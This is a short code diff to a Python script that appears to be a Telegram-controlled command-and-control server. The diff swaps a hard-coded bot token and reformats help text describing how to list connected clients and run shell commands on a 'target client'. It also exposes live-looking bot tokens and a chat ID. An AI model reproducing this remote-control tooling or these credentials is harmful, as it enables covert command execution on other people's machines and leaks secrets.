@@ -3,7 +3,7 @@ import threading
 import requests
 
 # Telegram Bot Configuration
-BOT_TOKEN = "7341952786:AAErBcgGblJyjBpadb483rHyPdEBDjeeTfA"
+BOT_TOKEN = "7333847070:AAFUwJpWNvTZTQLVIsbcCicJZlWAmqFFNa4"
 CHAT_ID = "7416312733"
 TELEGRAM_API_URL = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
 
@@ -29,17 +29,17 @@ def send_help_message():
 
 1. **/start** - Start the bot and check if the server is ready.
 2. **list** - Get a list of all active clients connected to the server.
-   - Format: `list`
+   - Format: list
 3. **control** - Send a command to a specific client.
-   - Format: `control <client_id> <command>`
-   - Example: `control 1 ls`
+   - Format: control <client_id> <command>
+   - Example: control 1 ls
 4. **exit** - Shut down the server and disconnect all clients.
-   - Format: `exit`
+   - Format: exit
 
 💡 **How it works**:
-- Each client connected to the server gets a unique `client_id`.
-- Use the `list` command to view active `client_id`s and their details.
-- Use the `control` command to execute a shell command on a target client.
+- Each client connected to the server gets a unique client_id.
+- Use the list command to view active client_ids and their details.
+- Use the control command to execute a shell command on a target client.
 
 Use responsibly and ethically! 🚀
 """
